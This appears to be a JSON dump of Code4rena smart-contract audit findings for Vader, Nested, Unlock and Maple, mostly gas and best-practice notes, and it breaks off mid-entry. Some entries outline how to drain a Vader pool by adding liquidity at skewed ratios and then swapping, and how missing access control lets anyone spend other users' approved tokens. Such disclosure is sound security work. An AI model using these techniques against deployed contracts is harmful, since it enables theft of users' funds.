[
  {
    "title": "Disregarding Check Effects in `VaderBond.redeem()` ",
    "body": "# Handle\n\nelprofesor\n\n\n# Vulnerability details\n\n## Impact\nIn `VaderBond.redeem()` we see lack of check-effects pattern, where `bondInfo[depositor]` is deleted prior to checking the success of `payoutToken.transfer()`. When coupled with 'ERC20 Return Values not checked', and 'VaderBond maxPayout has insufficient validation' this may lead to deletion of bondInfo at the cost of no payoutTokens being transfered.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/repo/vader-bond/contracts/VaderBond.sol#L220\n\n## Recommended Mitigation Steps\n`delete bondInfo[_depositor];` Should occur after transfer return values have been validated. Recommended implementation can be seen below:\n```\npayoutToken.safeTransfer(_depositor, info.payout); // @audit - ANTI-PATTERN: CHECK-EFFECTS, token does not implement safe transfer, and deletion occurs before safeTransfer\ndelete bondInfo[_depositor]; // delete user info\nemit BondRedeemed(_depositor, info.payout, 0); // emit bond data\nreturn info.payout;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/219"
    }
  },
  {
    "title": "Missing events for critical operations",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nAcross the contracts, there are certain critical operations that change critical values that affect the users of the protocol.\n\nIt's a best practice for these setter functions to emit events to record these changes on-chain for off-chain monitors/tools/interfaces to register the updates and react if necessary.\n\nInstances include:\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L431-L437\n\n```solidity=431\nfunction setFungibleTokenSupport(IERC20 foreignAsset)\n        external\n        override\n        onlyOwner\n    {\n        wrapper.createWrapper(foreignAsset);\n    }\n```\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L413-L423\n\n```solidity=413\n function setTokenSupport(IERC20 foreignAsset, bool support)\n        external\n        override\n        onlyOwner\n    {\n        require(\n            supported[foreignAsset] != support,\n            \"VaderPoolV2::supportToken: Already At Desired State\"\n        );\n        supported[foreignAsset] = support;\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/214"
    }
  },
  {
    "title": "Wrong design/implementation of `addLiquidity()` allows attacker to steal funds from the liquidity pool",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThe current design/implementation of Vader pool allows users to `addLiquidity` using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2.\n\nWe believe this design is flawed and it essentially allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers.\n\nAn attacker can exploit this by adding liquidity in extreme amounts and drain the funds from the pool.\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\n\n```solidity=284\nfunction mintFungible(\n    IERC20 foreignAsset,\n    uint256 nativeDeposit,\n    uint256 foreignDeposit,\n    address from,\n    address to\n) external override nonReentrant returns (uint256 liquidity) {\n    IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n    require(\n        lp != IERC20Extended(_ZERO_ADDRESS),\n        \"VaderPoolV2::mintFungible: Unsupported Token\"\n    );\n\n    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n        foreignAsset\n    ); // gas savings\n\n    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n    PairInfo storage pair = pairInfo[foreignAsset];\n    uint256 totalLiquidityUnits = pair.totalSupply;\n    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n    else\n        liquidity = VaderMath.calculateLiquidityUnits(\n            nativeDeposit,\n            reserveNative,\n            foreignDeposit,\n            reserveForeign,\n            totalLiquidityUnits\n        );\n\n    require(\n        liquidity > 0,\n        \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n    );\n\n    pair.totalSupply = totalLiquidityUnits + liquidity;\n\n    _update(\n        foreignAsset,\n        reserveNative + nativeDeposit,\n        reserveForeign + foreignDeposit,\n        reserveNative,\n        reserveForeign\n    );\n\n    lp.mint(to, liquidity);\n\n    emit Mint(from, to, nativeDeposit, foreignDeposit);\n}\n```\n\n### PoC\n\nGiven:\n\n- A Vader pool with `100,000 USDV` and `1 BTC`;\n- The `totalPoolUnits` is `100`.\n\nThe attacker can do the following in one transaction:\n\n1. Add liquidity with `100,000 USDV` and 0 BTC, get `50 liquidityUnits`, representing 1/3 shares of the pool;\n2. Swap `0.1 BTC` to USDV, repeat for 5 times; spent`0.5 BTC` and got `62163.36 USDV`;\n3. Remove liquidity, get back `45945.54 USDV` and `0.5 BTC`; profit for: 62163.36 + 45945.54 - 100000 = 8108.9 USDV.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/212"
    }
  },
  {
    "title": "Lack of access control allow attacker to `mintFungible()` and `mintSynth()` with other user's wallet balance",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\n\n```solidity=284\nfunction mintFungible(\n        IERC20 foreignAsset,\n        uint256 nativeDeposit,\n        uint256 foreignDeposit,\n        address from,\n        address to\n    ) external override nonReentrant returns (uint256 liquidity) {\n        IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n        require(\n            lp != IERC20Extended(_ZERO_ADDRESS),\n            \"VaderPoolV2::mintFungible: Unsupported Token\"\n        );\n\n        (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n            foreignAsset\n        ); // gas savings\n\n        nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n        foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n        PairInfo storage pair = pairInfo[foreignAsset];\n        uint256 totalLiquidityUnits = pair.totalSupply;\n        if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n        else\n            liquidity = VaderMath.calculateLiquidityUnits(\n                nativeDeposit,\n                reserveNative,\n                foreignDeposit,\n                reserveForeign,\n                totalLiquidityUnits\n            );\n\n        require(\n            liquidity > 0,\n            \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n        );\n\n        pair.totalSupply = totalLiquidityUnits + liquidity;\n\n        _update(\n            foreignAsset,\n            reserveNative + nativeDeposit,\n            reserveForeign + foreignDeposit,\n            reserveNative,\n            reserveForeign\n        );\n\n        lp.mint(to, liquidity);\n\n        emit Mint(from, to, nativeDeposit, foreignDeposit);\n    }\n```\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\n\nFunds are transferred from the `from` parameter, and the output tokens are transferred to the `to` parameter, both passed by the caller without proper access control.\n\n### Impact\n\nThis issue allows anyone to call `mintFungible()` and `mintSynth()` and steal almost all their wallet balances for all the users who have approved the contract before.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/204"
    }
  },
  {
    "title": "Tokens with fee on transfer are not supported",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`, E.g `Vader` token.\n\nIn the current implementation, `BasePoolV2.sol#mint()` assumes that the received amount is the same as the transfer amount, and uses it to calculate liquidity units.\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L168-L229\n\n```solidity=168\nfunction mint(\n    IERC20 foreignAsset,\n    uint256 nativeDeposit,\n    uint256 foreignDeposit,\n    address from,\n    address to\n)\n    external\n    override\n    nonReentrant\n    onlyRouter\n    supportedToken(foreignAsset)\n    returns (uint256 liquidity)\n{\n    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n        foreignAsset\n    ); // gas savings\n\n    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n    PairInfo storage pair = pairInfo[foreignAsset];\n    uint256 totalLiquidityUnits = pair.totalSupply;\n    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n    else\n        liquidity = VaderMath.calculateLiquidityUnits(\n            nativeDeposit,\n            reserveNative,\n            foreignDeposit,\n            reserveForeign,\n            totalLiquidityUnits\n        );\n\n    require(\n        liquidity > 0,\n        \"BasePoolV2::mint: Insufficient Liquidity Provided\"\n    );\n\n    uint256 id = positionId++;\n\n    pair.totalSupply = totalLiquidityUnits + liquidity;\n    _mint(to, id);\n\n    positions[id] = Position(\n        foreignAsset,\n        block.timestamp,\n        liquidity,\n        nativeDeposit,\n        foreignDeposit\n    );\n\n    _update(\n        foreignAsset,\n        reserveNative + nativeDeposit,\n        reserveForeign + foreignDeposit,\n        reserveNative,\n        reserveForeign\n    );\n\n    emit Mint(from, to, nativeDeposit, foreignDeposit);\n    emit PositionOpened(from, to, id, liquidity);\n}\n```\n\n## Recommended\n\nConsider calling `balanceOf()` to get the actual balances.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/193"
    }
  },
  {
    "title": "`BasePoolV2#rescue()` should be `nonReentrant`",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L510-L517\n\n```solidity=510\nfunction rescue(IERC20 foreignAsset) external {\n    uint256 foreignBalance = foreignAsset.balanceOf(address(this));\n    uint256 reserveForeign = pairInfo[foreignAsset].reserveForeign;\n\n    uint256 unaccounted = foreignBalance - reserveForeign;\n\n    foreignAsset.safeTransfer(msg.sender, unaccounted);\n}\n```\n\nThe function `rescue` may be able to transfer funds before `reserveForeign` gets updated. It's safer to make it `nonReentrant`.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-vader-findings",
      "repo": "https://github.com/code-423n4/2021-11-vader-findings",
      "url": "https://github.com/code-423n4/2021-11-vader-findings/issues/191"
    }
  },
  {
    "title": "Small refactor for functions to save some gas",
    "body": "# Handle\n\n0xngndev\n\n\n# Vulnerability details\n\n## Impact\nIn `FeeSplitter.sol` by doing a small refactory gas can be saved in case of a revert in the functions: `getAmountDue` and `_releaseToken` . We can swap the order of two lines so we return earlier in case of a bad input, this way we save some gas because the evm would execute less opcodes before reverting.\n\n## Mitigation steps\ngetAmountDue: Swap line 83 with 84 to avoid computing unnecessary logic. Remove the \"else\"  and combine it with line 83. Something like this:\n\n```\n  function getAmountDue(address _account, IERC20 _token) public view returns (uint256) {\n        TokenRecords storage _tokenRecords = tokenRecords[address(_token)];\n\t\t\t\tif (_tokenRecords.totalShares == 0) return 0;\n        uint256 totalReceived = _tokenRecords.totalReleased + _token.balanceOf(address(this));\n        uint256 amountDue = (totalReceived * _tokenRecords.shares[_account]) /\n            _tokenRecords.totalShares -\n            _tokenRecords.released[_account];\n        return amountDue;\n    }\n```\n_releaseToken: move line 252 after the require in line 254. Like this:\n\n```\n  function _releaseToken(address _account, IERC20 _token) private returns (uint256) {\n        uint256 amountToRelease = getAmountDue(_account, _token);\n        require(amountToRelease != 0, \"FeeSplitter: NO_PAYMENT_DUE\");\n        TokenRecords storage _tokenRecords = tokenRecords[address(_token)];\n\n        _tokenRecords.released[_account] = _tokenRecords.released[_account] + amountToRelease;\n        _tokenRecords.totalReleased = _tokenRecords.totalReleased + amountToRelease;\n\n        return amountToRelease;\n    }\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-nested-findings",
      "repo": "https://github.com/code-423n4/2021-11-nested-findings",
      "url": "https://github.com/code-423n4/2021-11-nested-findings/issues/193"
    }
  },
  {
    "title": "Cache and read storage variables from the stack can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the storage variables that will be accessed multiple times, cache and read from the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).\n\nFor example:\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/FeeSplitter.sol#L152-L162\n\n```solidity=152\nfunction sendFeesWithRoyalties(\n    address _royaltiesTarget,\n    IERC20 _token,\n    uint256 _amount\n) external nonReentrant {\n    require(_royaltiesTarget != address(0), \"FeeSplitter: INVALID_ROYALTIES_TARGET_ADDRESS\");\n\n    _sendFees(_token, _amount, totalWeights);\n    _addShares(_royaltiesTarget, _computeShareCount(_amount, royaltiesWeight, totalWeights), address(_token));\n}\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=152\nfunction sendFeesWithRoyalties(\n    address _royaltiesTarget,\n    IERC20 _token,\n    uint256 _amount\n) external nonReentrant {\n    require(_royaltiesTarget != address(0), \"FeeSplitter: INVALID_ROYALTIES_TARGET_ADDRESS\");\n\n    uint256 _totalWeights = totalWeights;\n\n    _sendFees(_token, _amount, _totalWeights);\n    _addShares(_royaltiesTarget, _computeShareCount(_amount, royaltiesWeight, _totalWeights), address(_token));\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-nested-findings",
      "repo": "https://github.com/code-423n4/2021-11-nested-findings",
      "url": "https://github.com/code-423n4/2021-11-nested-findings/issues/175"
    }
  },
  {
    "title": "Adding unchecked directive can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\nFor example:\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/NestedFactory.sol#L285-L309\n```solidity=285{306}\nfunction _submitInOrders(\n    uint256 _nftId,\n    IERC20 _inputToken,\n    uint256 _inputTokenAmount,\n    Order[] calldata _orders,\n    bool _reserved,\n    bool _fromReserve\n) private returns (uint256 feesAmount, IERC20 tokenSold) {\n    _inputToken = _transferInputTokens(_nftId, _inputToken, _inputTokenAmount, _fromReserve);\n    uint256 amountSpent;\n    for (uint256 i = 0; i < _orders.length; i++) {\n        amountSpent += _submitOrder(address(_inputToken), _orders[i].token, _nftId, _orders[i], _reserved);\n    }\n    feesAmount = _calculateFees(_msgSender(), amountSpent);\n    assert(amountSpent <= _inputTokenAmount - feesAmount); // overspent\n\n    // If input is from the reserve, update the records\n    if (_fromReserve) {\n        _decreaseHoldingAmount(_nftId, address(_inputToken), _inputTokenAmount);\n    }\n\n    _handleUnderSpending(_inputTokenAmount - feesAmount, amountSpent, _inputToken);\n\n    tokenSold = _inputToken;\n}\n```\n\n`_inputTokenAmount - feesAmount` at L306 will never underflow.\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/FeeSplitter.sol#L166-L174\n\n```solidity=166{167}\nfunction updateShareholder(uint256 _accountIndex, uint256 _weight) external onlyOwner {\n    require(_accountIndex + 1 <= shareholders.length, \"FeeSplitter: INVALID_ACCOUNT_INDEX\");\n    uint256 _totalWeights = totalWeights;\n    _totalWeights -= shareholders[_accountIndex].weight;\n    shareholders[_accountIndex].weight = _weight;\n    _totalWeights += _weight;\n    require(_totalWeights > 0, \"FeeSplitter: TOTAL_WEIGHTS_ZERO\");\n    totalWeights = _totalWeights;\n}\n```\n\n`_accountIndex + 1` will never overflow.\n\n\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/NestedBuybacker.sol#L107-L113\n```solidity=107{109}\nfunction trigger() internal {\n    uint256 balance = NST.balanceOf(address(this));\n    uint256 toBurn = (balance * burnPercentage) / 1000;\n    uint256 toSendToReserve = balance - toBurn;\n    _burnNST(toBurn);\n    NST.safeTransfer(nstReserve, toSendToReserve);\n}\n```\n\n`balance - toBurn` will never underflow.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-nested-findings",
      "repo": "https://github.com/code-423n4/2021-11-nested-findings",
      "url": "https://github.com/code-423n4/2021-11-nested-findings/issues/173"
    }
  },
  {
    "title": "Avoid unnecessary storage writes can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\n`releaseToken()` has `nonReentrant` modifier, making `releaseTokens()` to set storage `_status` multiple times in the for loop.\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/FeeSplitter.sol#L116-L129\n\n```solidity=116\nfunction releaseToken(IERC20 _token) public nonReentrant {\n    uint256 amount = _releaseToken(_msgSender(), _token);\n    _token.safeTransfer(_msgSender(), amount);\n    emit PaymentReleased(_msgSender(), address(_token), amount);\n}\n\n/// @notice Call releaseToken() for multiple tokens\n/// @param _tokens ERC20 tokens to release\nfunction releaseTokens(IERC20[] memory _tokens) external {\n    for (uint256 i = 0; i < _tokens.length; i++) {\n        releaseToken(_tokens[i]);\n    }\n}\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=116\nfunction releaseToken(IERC20 _token) public nonReentrant {\n    _releaseTokenAndTransfer(_token);\n}\n\n/// @notice Call releaseToken() for multiple tokens\n/// @param _tokens ERC20 tokens to release\nfunction releaseTokens(IERC20[] memory _tokens) external {\n    for (uint256 i = 0; i < _tokens.length; i++) {\n        _releaseTokenAndTransfer(_tokens[i]);\n    }\n}\n\nfunction _releaseTokenAndTransfer(IERC20 _token) private {\n    uint256 amount = _releaseToken(_msgSender(), _token);\n    _token.safeTransfer(_msgSender(), amount);\n    emit PaymentReleased(_msgSender(), address(_token), amount);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-nested-findings",
      "repo": "https://github.com/code-423n4/2021-11-nested-findings",
      "url": "https://github.com/code-423n4/2021-11-nested-findings/issues/162"
    }
  },
  {
    "title": "`NestedFactory.sol#_submitInOrders()` Wrong implementation cause users to be overcharged",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nWhen executing orders, the actual `amountSpent + feesAmount` can be lower than `_inputTokenAmount`, the unspent amount should be returned to the user.\n\nHowever, in the current implementation, the unspent amount will be taken as part of the fee.\n\nhttps://github.com/code-423n4/2021-11-nested/blob/f646002b692ca5fa3631acfff87dda897541cf41/contracts/NestedFactory.sol#L285-L309\n\n```solidity=285\nfunction _submitInOrders(\n    uint256 _nftId,\n    IERC20 _inputToken,\n    uint256 _inputTokenAmount,\n    Order[] calldata _orders,\n    bool _reserved,\n    bool _fromReserve\n) private returns (uint256 feesAmount, IERC20 tokenSold) {\n    _inputToken = _transferInputTokens(_nftId, _inputToken, _inputTokenAmount, _fromReserve);\n    uint256 amountSpent;\n    for (uint256 i = 0; i < _orders.length; i++) {\n        amountSpent += _submitOrder(address(_inputToken), _orders[i].token, _nftId, _orders[i], _reserved);\n    }\n    feesAmount = _calculateFees(_msgSender(), amountSpent);\n    assert(amountSpent <= _inputTokenAmount - feesAmount); // overspent\n\n    // If input is from the reserve, update the records\n    if (_fromReserve) {\n        _decreaseHoldingAmount(_nftId, address(_inputToken), _inputTokenAmount);\n    }\n\n    _handleUnderSpending(_inputTokenAmount - feesAmount, amountSpent, _inputToken);\n\n    tokenSold = _inputToken;\n}\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=285\nfunction _submitInOrders(\n    uint256 _nftId,\n    IERC20 _inputToken,\n    uint256 _inputTokenAmount,\n    Order[] calldata _orders,\n    bool _reserved,\n    bool _fromReserve\n) private returns (uint256 feesAmount, IERC20 tokenSold) {\n    _inputToken = _transferInputTokens(_nftId, _inputToken, _inputTokenAmount, _fromReserve);\n    uint256 amountSpent;\n    for (uint256 i = 0; i < _orders.length; i++) {\n        amountSpent += _submitOrder(address(_inputToken), _orders[i].token, _nftId, _orders[i], _reserved);\n    }\n    feesAmount = _calculateFees(_msgSender(), amountSpent);\n    assert(amountSpent <= _inputTokenAmount - feesAmount); // overspent\n\n    // If input is from the reserve, update the records\n    if (_fromReserve) {\n        _decreaseHoldingAmount(_nftId, address(_inputToken), amountSpent+feesAmount);\n    }\n\n    ExchangeHelpers.setMaxAllowance(_token, address(feeSplitter));\n    feeSplitter.sendFees(_token, feesAmount);\n\n    if (_inputTokenAmount > amountSpent + feesAmount) {\n        _inputToken.transfer(_fromReserve ? address(reserve) : _msgSender(), _inputTokenAmount - amountSpent - feesAmount);\n    }\n\n    tokenSold = _inputToken;\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-nested-findings",
      "repo": "https://github.com/code-423n4/2021-11-nested-findings",
      "url": "https://github.com/code-423n4/2021-11-nested-findings/issues/160"
    }
  },
  {
    "title": "Distribution of tokens in recordKeyPurchase",
    "severity": "minor",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nfunction recordKeyPurchas does not distribute the tokens on chainId > 1 when the balance is not sufficient:\n```solidity\n  uint balance = IMintableERC20(udt).balanceOf(address(this));\n  if (balance > tokensToDistribute) {\n    // Only distribute if there are enough tokens\n    IMintableERC20(udt).transfer(_referrer, tokensToDistribute - devReward);\n    IMintableERC20(udt).transfer(owner(), devReward);\n  }\n```\n\nI see at least 2 problems here. First, the check should be inclusive >=, because now when balance = tokensToDistribute, it will still skip the distribution.\nAnother problem, I think it is not fair when only a small fraction is missing, you should consider distributing the whole balance in this case. \n\n## Recommended Mitigation Steps\nHere is my prosposed solution:\n```solidity\n  uint balance = IMintableERC20(udt).balanceOf(address(this));\n  if (balance >= tokensToDistribute) {\n    IMintableERC20(udt).transfer(_referrer, tokensToDistribute - devReward);\n    IMintableERC20(udt).transfer(owner(), devReward);\n  } else {\n    devReward = balance * 20 / 100;\n    IMintableERC20(udt).transfer(_referrer, balance - devReward);\n    IMintableERC20(udt).transfer(owner(), devReward);\n  }\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-unlock-findings",
      "repo": "https://github.com/code-423n4/2021-11-unlock-findings",
      "url": "https://github.com/code-423n4/2021-11-unlock-findings/issues/230"
    }
  },
  {
    "title": "Support of different ERC20 tokens",
    "severity": "minor",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nThe current version of the codebase does not handle special cases of tokens, e.g. deflationary, rebasing, or those that return true/false on success (see: https://github.com/d-xo/weird-erc20). Function purchase transfers tokens from msg.sender but it does not check the return value, nor how many tokens were actually transferred:\n```solidity\n  token.transferFrom(msg.sender, address(this), pricePaid);\n```\n\n## Recommended Mitigation Steps\nI have 2 suggestions here:\n1) Use SafeERC20 library to handle token transfers: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol\n2) Consider checking the actual balances transferred (balance after-before) or clearly documenting that you do not support deflationary / rebasing / etc tokens.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-unlock-findings",
      "repo": "https://github.com/code-423n4/2021-11-unlock-findings",
      "url": "https://github.com/code-423n4/2021-11-unlock-findings/issues/221"
    }
  },
  {
    "title": "Unable to change token approval when tokenAddress changed",
    "body": "# Handle\n\ngzeon\n\n\n# Vulnerability details\n\n## Impact\nLock manager and beneficiary can call `approveBeneficiary` to set the allowance of `tokenAddress`. However, if `tokenAddress` is changed by `updateKeyPricing`, they will not be able to revoke the token approval set previously.\n\n## Proof of Concept\nhttps://github.com/unlock-protocol/unlock/blob/025ed6ab14c10cc41d7fe14ab49a051647211adb/smart-contracts/contracts/mixins/MixinLockCore.sol#L226\n\n## Recommended Mitigation Steps\n```\n  function approveBeneficiary(\n    address _spender,\n    address _tokenAddress,\n    uint _amount\n  ) public\n    onlyLockManagerOrBeneficiary\n    returns (bool)\n  {\n    return IERC20Upgradeable(_tokenAddress).approve(_spender, _amount);\n  }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-unlock-findings",
      "repo": "https://github.com/code-423n4/2021-11-unlock-findings",
      "url": "https://github.com/code-423n4/2021-11-unlock-findings/issues/215"
    }
  },
  {
    "title": "Gas improvement on the nonce increment",
    "body": "# Handle\n\ndefsec\n\n\n# Vulnerability details\n\n## Impact\n\nThe increment of the nonce in function delegateBySig() of ERC20VotesUpgradeable.sol uses a temporary variable.\n\nThis is not necessary because the temporary variable isn't used elsewhere.\nThus a bit of gas could be saved by using nonce++.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n\"https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/ERC20Patched.sol#L1510\"\n\n2. On the nonce increment progress, some gas can be saved. \n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nUse \"nonce++\" in the following way:\nbytes32 hash = keccak256(abi.encode(address(this), block.chainid, nonce++, txns));\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-unlock-findings",
      "repo": "https://github.com/code-423n4/2021-11-unlock-findings",
      "url": "https://github.com/code-423n4/2021-11-unlock-findings/issues/210"
    }
  },
  {
    "title": "Reuse arithmetic results can save gas ",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/maple-labs/debt-locker/blob/81f55907db7b23d27e839b9f9f73282184ed4744/contracts/DebtLocker.sol#L205-L215\n\n```solidity\nfunction _handleClaimOfRepossessed() internal returns (uint256[7] memory details_) {\n    ...\n    details_[0] = recoveredFunds + fundsCaptured;\n    details_[1] = recoveredFunds > principalToCover ? recoveredFunds - principalToCover : 0;\n    details_[2] = fundsCaptured;\n    details_[5] = recoveredFunds > principalToCover ? principalToCover : recoveredFunds;\n    details_[6] = principalToCover > recoveredFunds ? principalToCover - recoveredFunds : 0;\n\n    _fundsToCapture = uint256(0);\n    _repossessed    = false;\n\n    require(ERC20Helper.transfer(fundsAsset, _pool, recoveredFunds + fundsCaptured), \"DL:HCOR:TRANSFER\");\n}\n```\n\n`recoveredFunds + fundsCaptured` at L215 is calculated before at L205, since it's a checked arithmetic operation with two memory variables, resue the result instead of doing the arithmetic operation again can save gas.\n\n### Recommendation\n\nChange to:\n\n`require(ERC20Helper.transfer(fundsAsset, _pool, details_[0]), \"DL:HCOR:TRANSFER\");`\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/66"
    }
  },
  {
    "title": "Cache external call result in the stack can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the result of an external call being written into a storage variable, cache and read from the stack rather than read from the storage variable can save gas.\n\nInstances include:\n\n`IERC20Like(collateralAsset).decimals()` in `DebtLocker.sol#getExpectedAmount()` can be cached to avoid an extra external call.\n\nhttps://github.com/maple-labs/debt-locker/blob/81f55907db7b23d27e839b9f9f73282184ed4744/contracts/DebtLocker.sol#L237-L253\n\n```solidity=231\nfunction getExpectedAmount(uint256 swapAmount_) external view override whenProtocolNotPaused returns (uint256 returnAmount_) {\n    address collateralAsset = IMapleLoanLike(_loan).collateralAsset();\n    address fundsAsset      = IMapleLoanLike(_loan).fundsAsset();\n\n    uint256 oracleAmount =\n        swapAmount_\n            * IMapleGlobalsLike(_getGlobals()).getLatestPrice(collateralAsset)  // Convert from `fromAsset` value.\n            * 10 ** IERC20Like(fundsAsset).decimals()                           // Convert to `toAsset` decimal precision.\n            * (10_000 - _allowedSlippage)                                       // Multiply by allowed slippage basis points\n            / IMapleGlobalsLike(_getGlobals()).getLatestPrice(fundsAsset)       // Convert to `toAsset` value.\n            / 10 ** IERC20Like(collateralAsset).decimals()                      // Convert from `fromAsset` decimal precision.\n            / 10_000;                                                           // Divide basis points for slippage\n\n    uint256 minRatioAmount = swapAmount_ * _minRatio / 10 ** IERC20Like(collateralAsset).decimals();\n\n    return oracleAmount > minRatioAmount ? oracleAmount : minRatioAmount;\n}\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=231\nfunction getExpectedAmount(uint256 swapAmount_) external view override whenProtocolNotPaused returns (uint256 returnAmount_) {\n    address collateralAsset = IMapleLoanLike(_loan).collateralAsset();\n    address fundsAsset      = IMapleLoanLike(_loan).fundsAsset();\n\n    uint256 collateralAssetDecimals = IERC20Like(collateralAsset).decimals();\n\n    uint256 oracleAmount =\n        swapAmount_\n            * IMapleGlobalsLike(_getGlobals()).getLatestPrice(collateralAsset)  // Convert from `fromAsset` value.\n            * 10 ** IERC20Like(fundsAsset).decimals()                           // Convert to `toAsset` decimal precision.\n            * (10_000 - _allowedSlippage)                                       // Multiply by allowed slippage basis points\n            / IMapleGlobalsLike(_getGlobals()).getLatestPrice(fundsAsset)       // Convert to `toAsset` value.\n            / 10 ** collateralAssetDecimals                                     // Convert from `fromAsset` decimal precision.\n            / 10_000;                                                           // Divide basis points for slippage\n\n    uint256 minRatioAmount = swapAmount_ * _minRatio / 10 ** collateralAssetDecimals;\n\n    return oracleAmount > minRatioAmount ? oracleAmount : minRatioAmount;\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
